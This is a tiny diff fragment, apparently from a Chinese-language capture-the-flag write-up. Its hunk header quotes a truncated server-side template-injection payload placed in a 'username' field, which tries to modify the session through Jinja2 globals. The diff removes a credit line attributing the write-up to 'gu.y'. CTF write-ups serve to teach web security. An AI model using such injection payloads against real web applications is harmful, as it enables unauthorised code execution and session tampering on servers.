@@ -714,6 +714,3 @@ b'{"flag":"red\\n","username":"{%if session.update({\'flag\':lipsum[\'__globals_
 
 答案 `Index`
 
-
-
-整理复现来自gu.y
